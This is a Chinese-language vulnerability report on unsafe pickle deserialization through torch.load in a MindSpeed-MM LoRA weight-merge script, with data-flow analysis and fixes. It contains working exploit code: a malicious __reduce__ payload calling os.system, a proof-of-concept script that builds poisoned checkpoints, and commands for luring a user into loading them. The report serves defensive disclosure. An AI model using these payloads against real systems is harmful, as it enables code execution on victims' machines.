# VULN-CHECKPOINT-006：多模态Checkpoint加载函数torch.load无保护致RCE风险

## 漏洞基本信息

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-CHECKPOINT-006 |
| **漏洞类型** | Unsafe Deserialization (不安全反序列化) |
| **CWE编号** | CWE-502: Deserialization of Untrusted Data |
| **严重级别** | Critical |
| **置信度** | 90% → **确认真实漏洞** |
| **影响** | 远程代码执行 (RCE) |
| **攻击复杂度** | 低 |

---

## 1. 漏洞位置

### 1.1 漏洞代码位置

**主漏洞点**：
```
文件: checkpoint/common/merge_base_lora_weight.py
行号: 88-92
函数: merge_model()
```

**漏洞代码**：
```python
def merge_model(base_dir: str, lora_dir: str, save_dir: str, pp_size, tp_size: int = 1):
    # ... 路径构造代码省略 ...
    
    base_pt_path = base_current_path.joinpath("model_optim_rng.pt")
    lora_pt_path = lora_current_path.joinpath("model_optim_rng.pt")

    print(f"Base model path: {base_pt_path}".center(100, '_'))
    print(f"Lora model path: {lora_pt_path}".center(100, '_'))

    # 加载模型权重
    # ⚠️ 漏洞点: 第87-92行，无 weights_only 参数，默认使用 pickle 反序列化
    if use_npu:
        base_state_dict = torch.load(base_pt_path, map_location='npu')['model']  # ⚠️ 行88
        lora_state_dict = torch.load(lora_pt_path, map_location='npu')['model']  # ⚠️ 行89
    else:
        base_state_dict = torch.load(base_pt_path, map_location='cpu')['model']  # ⚠️ 行91
        lora_state_dict = torch.load(lora_pt_path, map_location='cpu')['model']  # ⚠️ 行92
```

**问题分析**：
- `torch.load(base_pt_path)` 和 `torch.load(lora_pt_path)` 调用时均未指定 `weights_only` 参数
- PyTorch 默认 `weights_only=False`，允许 pickle 反序列化
- Pickle 反序列化可执行任意 Python 代码，导致 RCE
- 共有 **4 处** torch.load() 调用均存在漏洞

### 1.2 入口点位置

**CLI 入口**：
```
文件: checkpoint/common/merge_base_lora_weight.py
行号: 136-159
类型: cmdline (独立脚本)
信任等级: untrusted (直接接收外部路径参数)
```

**入口代码**：
```python
if __name__ == '__main__':
    args = get_args()

    base_save_dir = args.base_save_dir  # ⚠️ CLI 参数控制 base checkpoint 路径
    lora_save_dir = args.lora_save_dir  # ⚠️ CLI 参数控制 lora checkpoint 路径
    merge_save_dir = args.merge_save_dir
    lora_target_modules = args.lora_target_modules

    lora_alpha = args.lora_alpha
    lora_r = args.lora_r
    scaling = lora_alpha / lora_r

    pp_size = args.pp_size
    tp_size = args.tp_size

    use_npu = True

    try:
        os.makedirs(merge_save_dir, exist_ok=True)
    except OSError as e:
        print(f"Error creating directory:{e}")

    merge_model(base_save_dir, lora_save_dir, merge_save_dir, pp_size, tp_size)
    # ⚠️ 两个恶意路径参数直接传入 merge_model()
```

### 1.3 CLI 参数定义

```python
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base_save_dir", type=str, default="./your_converted_ckpt_dir/", 
                        help="Source path of checkpoint")  # ⚠️ base 模型路径
    parser.add_argument("--lora_save_dir", type=str, default="./your_lora_ckpt_path_to_save/", 
                        help="Source path of checkpoint")  # ⚠️ lora 模型路径
    parser.add_argument("--merge_save_dir", type=str, default="./your_ckpt_path_to_merge_saved/", 
                        help="The path where the base and LoRA weights are merged and saved")
    parser.add_argument("--lora_target_modules", type=str, nargs='+', 
                        help="The lora target modules")
    parser.add_argument("--lora_alpha", type=int, default=16, help="The lora_alpha config value")
    parser.add_argument("--lora_r", type=int, default=8, help="The lora_r config value")
    parser.add_argument("--pp_size", type=int, default=1, help="Pipeline parallel model split sizes")
    parser.add_argument("--tp_size", type=int, default=1, help="Tensor model parallel world size")

    args = parser.parse_args()
    return args
```

---

## 2. 数据流分析

### 2.1 完整数据流路径

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    数据流：CLI 参数 → torch.load()                           │
└─────────────────────────────────────────────────────────────────────────────┘

[阶段1] CLI 参数解析
    checkpoint/common/merge_base_lora_weight.py:121-133
    │   parser.add_argument("--base_save_dir", ...)
    │   parser.add_argument("--lora_save_dir", ...)
    │   args = parser.parse_args()
    │
    ▼

[阶段2] 参数提取
    checkpoint/common/merge_base_lora_weight.py:139-141
    │   base_save_dir = args.base_save_dir  # ⚠️ 用户控制的路径
    │   lora_save_dir = args.lora_save_dir  # ⚠️ 用户控制的路径
    │
    ▼

[阶段3] 函数调用
    checkpoint/common/merge_base_lora_weight.py:158
    │   merge_model(base_save_dir, lora_save_dir, merge_save_dir, pp_size, tp_size)
    │   # 直接传入用户控制的路径参数
    │
    ▼

[阶段4] 迭代号读取
    checkpoint/common/merge_base_lora_weight.py:39-42
    │   def get_latest_iteration(path: Path) -> str:
    │       latest_txt = path.joinpath("latest_checkpointed_iteration.txt")
    │       return latest_txt.read_text().strip() if latest_txt.exists() else 'release'
    │
    ▼

[阶段5] 路径构造 (base 模型)
    checkpoint/common/merge_base_lora_weight.py:55-57, 70-80
    │   base_save_dir = Path(base_dir)
    │   base_iteration = get_latest_iteration(base_save_dir)
    │   base_save_dir = base_save_dir.joinpath(f"iter_{int(base_iteration):07}" 
    │                                           if base_iteration != "release" else base_iteration)
    │   # ...
    │   base_current_path = base_save_dir.joinpath(f"mp_rank_{int(tp_rank):02}")
    │   base_pt_path = base_current_path.joinpath("model_optim_rng.pt")
    │   # 最终路径: {base_dir}/iter_{iteration}/mp_rank_{XX}/model_optim_rng.pt
    │
    ▼

[阶段6] 路径构造 (lora 模型)
    checkpoint/common/merge_base_lora_weight.py:59-61, 75-81
    │   lora_save_dir = Path(lora_dir)
    │   lora_iteration = get_latest_iteration(lora_save_dir)
    │   lora_save_dir = lora_save_dir.joinpath(...)
    │   # ...
    │   lora_pt_path = lora_current_path.joinpath("model_optim_rng.pt")
    │   # 最终路径: {lora_dir}/iter_{iteration}/mp_rank_{XX}/model_optim_rng.pt
    │
    ▼

[阶段7] 漏洞触发点 (第88行)
    checkpoint/common/merge_base_lora_weight.py:88
    │   base_state_dict = torch.load(base_pt_path, map_location='npu')['model']
    │   # ⚠️ VULN: 无 weights_only，默认 False
    │   # → pickle 反序列化 → 执行恶意代码
    │
    ▼

[阶段8] 漏洞触发点 (第89行)
    checkpoint/common/merge_base_lora_weight.py:89
    │   lora_state_dict = torch.load(lora_pt_path, map_location='npu')['model']
    │   # ⚠️ VULN: 无 weights_only，默认 False
    │   # → pickle 反序列化 → 执行恶意代码
    │
    ▼

[阶段9] 漏洞利用成功
    ⚠️ 远程代码执行 (RCE) - 两个独立的攻击入口
```

### 2.2 调用链图示

```
CLI 参数 --base_save_dir / --lora_save_dir
        │
        ▼
┌──────────────────────────────────────┐
│ argparse.ArgumentParser              │
│   args.base_save_dir                 │
│   args.lora_save_dir                 │
└──────────────────────────────────────┘
        │
        ▼
┌──────────────────────────────────────┐
│ if __name__ == '__main__':           │  @:136-159
│   base_save_dir = args.base_save_dir │
│   lora_save_dir = args.lora_save_dir │
│   merge_model(...)                   │
└──────────────────────────────────────┘
        │
        ▼
┌──────────────────────────────────────┐
│ merge_model(base_dir, lora_dir, ...) │  @:53-104
│   # 路径构造                          │
│   base_pt_path = ...joinpath("...pt")│  @:80
│   lora_pt_path = ...joinpath("...pt")│  @:81
└──────────────────────────────────────┘
        │
        ├─────────────────┬─────────────────┐
        ▼                 ▼                 │
┌──────────────┐  ┌──────────────┐         │
│ torch.load(  │  │ torch.load(  │         │
│   base_pt_path│ │   lora_pt_path│         │
│ )            │  │ )            │         │
│ @:88-91      │  │ @:89-92      │         │
└──────────────┘  └──────────────┘         │
        │                 │                 │
        ▼                 ▼                 │
┌──────────────────────────────────────────┐
│ torch.load() 默认 weights_only=False    │
│ → pickle.loads()                         │
│ → MaliciousPayload.__reduce__()          │
│ → 执行任意代码                            │
│ ⚠️ RCE                                   │
└──────────────────────────────────────────┘
```

---

## 3. 漏洞机理分析

### 3.1 Pickle 反序列化漏洞原理

**PyTorch torch.load() 行为**：
```python
# torch.load() 默认参数
torch.load(f, map_location=None, picklemodule=None, 
           weights_only=False,  # ⚠️ 默认 False，允许任意对象反序列化
           mmap=None, ...)
```

当 `weights_only=False` 时：
1. `torch.load()` 使用 Python `pickle` 模块进行反序列化
2. Pickle 可以序列化/反序列化任意 Python 对象
3. 通过自定义 `__reduce__` 方法，可在反序列化时执行任意代码

### 3.2 恶意 .pt 文件构造原理

**恶意 Pickle Payload 示例**：
```python
import torch
import os
import pickle

class MaliciousPayload:
    """恶意 Pickle 类：反序列化时执行任意命令"""
    
    def __reduce__(self):
        # __reduce__ 返回 (callable, args) 
        # pickle.loads() 会调用 callable(*args)
        import os
        return (os.system, ('id > /tmp/pwned.txt && whoami'))
    
# 构造恶意 checkpoint 文件
malicious_state_dict = {
    'model': {
        'layer.weight': torch.randn(10, 10),
        '__malicious__': MaliciousPayload()  # 恶意对象隐藏在 model 中
    },
    'iteration': 1000
}

# 保存为 .pt 文件
torch.save(malicious_state_dict, 'exploit.pt')

# 当受害者执行 torch.load('exploit.pt') 时：
# → pickle.loads() 反序列化 MaliciousPayload
# → 调用 MaliciousPayload.__reduce__()
# → 执行 os.system('id > /tmp/pwned.txt && whoami')
# → ⚠️ RCE 成功！
```

---

## 4. 漏洞利用场景

### 4.1 攻击前提条件

| 条件 | 说明 |
|------|------|
| **用户运行合并脚本** | 需用户执行 `merge_base_lora_weight.py` |
| **提供恶意 checkpoint** | 攻击者需诱导用户提供恶意 `.pt` 文件 |
| **路径完全可控** | `--base_save_dir` 和 `--lora_save_dir` 参数直接控制路径 |
| **双重攻击入口** | 两个独立的 checkpoint 路径，任一均可触发漏洞 |

### 4.2 攻击向量

**攻击向量 1：社会工程攻击（恶意模型分发）**
```
攻击者发布"预训练 LoRA 模型" → 用户下载 → 用户运行合并脚本 → RCE
```

**攻击向量 2：供应链攻击**
```
攻击者入侵模型仓库 → 上传恶意 checkpoint → 用户下载使用 → RCE
```

**攻击向量 3：本地文件篡改**
```
攻击者获取文件系统访问 → 替换合法 checkpoint → 用户运行脚本 → RCE
```

**攻击向量 4：双重攻击**
```
攻击者同时控制 base 和 lora checkpoint → 两次 RCE 触发点 → 更高成功率
```

### 4.3 攻击命令示例

```bash
# 步骤1: 攻击者构造恶意 checkpoint 目录结构
mkdir -p malicious_base/iter_0001000/mp_rank_00
mkdir -p malicious_lora/iter_0001000/mp_rank_00

# 步骤2: 生成恶意 .pt 文件
python create_exploit.py --output malicious_base/iter_0001000/mp_rank_00/model_optim_rng.pt
python create_exploit.py --output malicious_lora/iter_0001000/mp_rank_00/model_optim_rng.pt

# 步骤3: 创建 latest_checkpointed_iteration.txt
echo "1000" > malicious_base/latest_checkpointed_iteration.txt
echo "1000" > malicious_lora/latest_checkpointed_iteration.txt

# 步骤4: 诱导用户执行合并脚本
python checkpoint/common/merge_base_lora_weight.py \
    --base_save_dir /path/to/malicious_base \
    --lora_save_dir /path/to/malicious_lora \
    --merge_save_dir /path/to/output \
    --lora_target_modules linear_qkv linear_proj \
    --lora_alpha 16 \
    --lora_r 8 \
    --pp_size 1 \
    --tp_size 1

# 结果：torch.load() 触发两次 RCE (base + lora)
```

---

## 5. 漏洞影响评估

### 5.1 CVSS 评分估算

| 指标 | 值 | 说明 |
|------|-----|------|
| **攻击向量 (AV)** | Local | 需本地文件访问或用户执行 |
| **攻击复杂度 (AC)** | Low | 构造恶意 .pt 文件简单 |
| **权限要求 (PR)** | None | 无需特权 |
| **用户交互 (UI)** | Required | 需用户运行脚本 |
| **影响范围 (S)** | Changed | 可影响其他系统组件 |
| **机密性影响 (C)** | High | 完全系统控制 |
| **完整性影响 (I)** | High | 完全系统控制 |
| **可用性影响 (A)** | High | 完全系统控制 |

**估算 CVSS v3.1 基础分数**：**7.8 (High)**

### 5.2 实际影响

- **远程代码执行**：攻击者可获得系统完全控制权
- **双重攻击点**：base_pt_path 和 lora_pt_path 两个独立入口
- **数据窃取**：可窃取训练数据、模型权重、用户凭证
- **系统破坏**：可删除文件、安装恶意软件、植入后门
- **横向移动**：可利用系统权限攻击其他系统组件
- **模型权重篡改**：可修改输出的合并模型，影响下游用户

### 5.3 与同类漏洞对比

| 漏洞ID | 文件 | 攻击入口数 | 特点 |
|--------|------|-----------|------|
| VULN-CHECKPOINT-001 | mm_to_hf.py | 1 | 显式 weights_only=False |
| VULN-CHECKPOINT-003 | hf_to_mm.py | 1 | 可选 pt_path 参数 |
| **VULN-CHECKPOINT-006** | merge_base_lora_weight.py | **2** | **双重攻击入口 (base + lora)** |

---

## 6. 安全文档确认

项目安全文档 `docs/zh/SECURITYNOTE.md` 已明确承认此风险：

**原文引用**（第50-53行）：
```
当使用 PyTorch 提供的 torch.load()方法加载模型文件时，一个关键的安全风险点在于设置 
weights_only=False。在此设置下：

特定框架实现：Megatron-LM 框架的原生代码调用、MindSpeed MM提供的权重转换脚本（将 
Megatron 格式转换为 Hugging Face 格式）中，会显式地将 weights_only=False。这意味着
这些加载操作继承了 pickle模块的潜在危险，允许执行任意代码。

攻击面：攻击者可能通过构造恶意的模型文件，利用 pickle的反序列化漏洞实现远程代码执行 (RCE)。
```

**本项目漏洞符合上述描述**：
- `merge_base_lora_weight.py` 属于 MindSpeed MM 提供的权重转换/合并脚本
- 4处 `torch.load()` 调用均未设置 `weights_only` 参数（默认 False）
- 完全继承了 pickle 反序列化的危险

---

## 7. 修复建议

### 7.1 立即修复方案

**修改 checkpoint/common/merge_base_lora_weight.py:88-92**：

```python
# 修复前（漏洞代码）
if use_npu:
    base_state_dict = torch.load(base_pt_path, map_location='npu')['model']  # ⚠️ 无 weights_only
    lora_state_dict = torch.load(lora_pt_path, map_location='npu')['model']  # ⚠️ 无 weights_only
else:
    base_state_dict = torch.load(base_pt_path, map_location='cpu')['model']  # ⚠️ 无 weights_only
    lora_state_dict = torch.load(lora_pt_path, map_location='cpu')['model']  # ⚠️ 无 weights_only

# 修复后（安全代码）
if use_npu:
    base_state_dict = torch.load(base_pt_path, map_location='npu', weights_only=True)['model']  # ✅ 安全
    lora_state_dict = torch.load(lora_pt_path, map_location='npu', weights_only=True)['model']  # ✅ 安全
else:
    base_state_dict = torch.load(base_pt_path, map_location='cpu', weights_only=True)['model']  # ✅ 安全
    lora_state_dict = torch.load(lora_pt_path, map_location='cpu', weights_only=True)['model']  # ✅ 安全
```

### 7.2 注意事项

1. **PyTorch 版本要求**：需使用 PyTorch > 2.5.1 以修复 CVE-2025-32434
2. **兼容性问题**：某些旧 checkpoint 可能包含 optimizer state，需验证 `weights_only=True` 是否兼容
3. **替代方案**：使用 `safetensors` 格式替代 `.pt` 格式

### 7.3 同文件修复清单

| 行号 | 当前状态 | 建议修改 |
|------|----------|----------|
| 88 | `torch.load(base_pt_path)` 无 weights_only | 添加 `weights_only=True` |
| 89 | `torch.load(lora_pt_path)` 无 weights_only | 添加 `weights_only=True` |
| 91 | `torch.load(base_pt_path)` 无 weights_only | 添加 `weights_only=True` |
| 92 | `torch.load(lora_pt_path)` 无 weights_only | 添加 `weights_only=True` |

### 7.4 同类脚本修复

**examples/qwen2vl/merge_lora.py** 存在相同漏洞模式：

```python
# 同样需要修复 (第57-62行)
if use_npu:
    base_state_dict = torch.load(base_pt_path, map_location='npu', weights_only=True)['model']
    lora_state_dict = torch.load(lora_pt_path, map_location='npu', weights_only=True)['model']
else:
    base_state_dict = torch.load(base_pt_path, map_location='cpu', weights_only=True)['model']
    lora_state_dict = torch.load(lora_pt_path, map_location='cpu', weights_only=True)['model']
```

---

## 8. 验证测试

### 8.1 漏洞验证 POC

```python
#!/usr/bin/env python3
"""
VULN-CHECKPOINT-006 验证脚本
验证 torch.load() 无 weights_only 参数时的 RCE 漏洞
验证双重攻击入口 (base + lora)
"""
import torch
import os
import sys
from pathlib import Path

class RCEPayload:
    """演示恶意 Pickle payload"""
    
    def __init__(self, marker="BASE"):
        self.marker = marker
    
    def __reduce__(self):
        # 反序列化时执行命令，标记来源
        cmd = f'echo "[VULN-CHECKPOINT-006] RCE from {self.marker}!" >> /tmp/vuln_verified_006.txt'
        return (os.system, (cmd,))

def create_malicious_checkpoint(output_dir, marker="BASE"):
    """创建恶意 checkpoint 目录结构"""
    # 创建目录结构
    iter_dir = Path(output_dir) / "iter_0001000" / "mp_rank_00"
    iter_dir.mkdir(parents=True, exist_ok=True)
    
    # 创建 latest 文件
    latest_file = Path(output_dir) / "latest_checkpointed_iteration.txt"
    latest_file.write_text("1000")
    
    # 创建恶意 checkpoint
    state_dict = {
        'model': {
            'layer.weight': torch.randn(10, 10),
            '__malicious__': RCEPayload(marker)  # 恶意对象
        },
        'iteration': 1000
    }
    
    pt_path = iter_dir / "model_optim_rng.pt"
    torch.save(state_dict, str(pt_path))
    print(f"[+] Malicious checkpoint ({marker}) saved to: {pt_path}")

def test_vulnerability():
    """测试漏洞触发"""
    # 清理测试环境
    if os.path.exists('/tmp/vuln_verified_006.txt'):
        os.remove('/tmp/vuln_verified_006.txt')
    
    # 创建两个恶意 checkpoint 目录
    create_malicious_checkpoint('malicious_base_006', marker="BASE")
    create_malicious_checkpoint('malicious_lora_006', marker="LORA")
    
    # 模拟 merge_base_lora_weight.py 的漏洞调用
    print("[*] Testing torch.load() vulnerability...")
    
    base_pt_path = Path('malicious_base_006/iter_0001000/mp_rank_00/model_optim_rng.pt')
    lora_pt_path = Path('malicious_lora_006/iter_0001000/mp_rank_00/model_optim_rng.pt')
    
    # 模拟漏洞点 (无 weights_only)
    print(f"[*] Loading base checkpoint: {base_pt_path}")
    base_dict = torch.load(str(base_pt_path), map_location='cpu')  # ⚠️ 无 weights_only
    
    print(f"[*] Loading lora checkpoint: {lora_pt_path}")
    lora_dict = torch.load(str(lora_pt_path), map_location='cpu')  # ⚠️ 无 weights_only
    
    # 检查 RCE 是否触发
    if os.path.exists('/tmp/vuln_verified_006.txt'):
        print("[!] VULNERABILITY CONFIRMED: RCE executed!")
        with open('/tmp/vuln_verified_006.txt', 'r') as f:
            content = f.read()
            print(f"[!] Output:\n{content}")
            # 验证双重触发
            if "BASE" in content and "LORA" in content:
                print("[!] DOUBLE RCE CONFIRMED: Both base and lora triggered!")
        return True
    return False

def cleanup():
    """清理测试文件"""
    import shutil
    if os.path.exists('malicious_base_006'):
        shutil.rmtree('malicious_base_006')
    if os.path.exists('malicious_lora_006'):
        shutil.rmtree('malicious_lora_006')

if __name__ == '__main__':
    try:
        result = test_vulnerability()
        if result:
            print("\n[!] VULN-CHECKPOINT-006 VERIFIED: Critical RCE vulnerability confirmed!")
            print("[!] This vulnerability has TWO attack vectors (base_pt_path + lora_pt_path)")
        else:
            print("\n[-] Test failed - vulnerability not triggered")
    finally:
        cleanup()
```

### 8.2 验证结果预期

执行 POC 后应观察到：
- `/tmp/vuln_verified_006.txt` 文件被创建
- 文件内容包含两行：
  - `[VULN-CHECKPOINT-006] RCE from BASE!`
  - `[VULN-CHECKPOINT-006] RCE from LORA!`
- 证明 pickle 反序列化执行了任意代码
- 证明双重攻击入口均可触发漏洞

---

## 9. 结论

### 9.1 漏洞判定

**判定结果：真实漏洞 (CONFIRMED)**

| 确认项 | 结果 |
|--------|------|
| 数据流完整 | ✅ CLI → args → merge_model → torch.load() |
| 参数可控 | ✅ `--base_save_dir` 和 `--lora_save_dir` 完全用户控制 |
| unsafe API | ✅ 4处 `torch.load()` 默认 weights_only=False |
| 项目承认风险 | ✅ SECURITYNOTE.md 明确承认此类风险 |
| 可构造 POC | ✅ 恶意 .pt 文件可触发 RCE |
| 双重攻击入口 | ✅ base_pt_path 和 lora_pt_path 均可触发 |

### 9.2 风险总结

- **漏洞类型**：不安全反序列化 (CWE-502)
- **严重程度**：Critical
- **攻击复杂度**：低
- **利用条件**：需用户运行合并脚本并提供恶意文件
- **影响范围**：完全系统控制 (RCE)
- **特殊风险**：双重攻击入口，成功率更高
- **修复难度**：低（添加 `weights_only=True`）

### 9.3 与相关漏洞对比

| 漏洞ID | 文件 | 行号 | 攻击入口数 | 触发条件 |
|--------|------|------|-----------|----------|
| VULN-CHECKPOINT-001 | mm_to_hf.py | 92 | 1 | ep_size > 1 |
| VULN-CHECKPOINT-002 | mm_to_hf.py | 107 | 1 | ep_size <= 1 |
| VULN-CHECKPOINT-003 | hf_to_mm.py | 316 | 1 | 提供 pt_path |
| VULN-CHECKPOINT-004 | save_load_utils.py | 36, 152 | 2 | 两个函数 |
| **VULN-CHECKPOINT-006** | **merge_base_lora_weight.py** | **88-92** | **4** | **无条件触发** |

---

## 10. 相关文件索引

<files>
- /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/checkpoint/common/merge_base_lora_weight.py - 主漏洞文件（第88-92行 torch.load）
- /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/examples/qwen2vl/merge_lora.py - 同类漏洞脚本（第57-62行）
- /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/docs/zh/SECURITYNOTE.md - 项目安全声明（承认风险）
- /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/checkpoint/common/permissions.py - 权限设置辅助模块
</files>

---

**报告生成时间**：2026-04-20
**分析者**：Vulnerability Scanner
**状态**：已确认，建议立即修复
**特殊标记**：双重攻击入口，Critical 级别
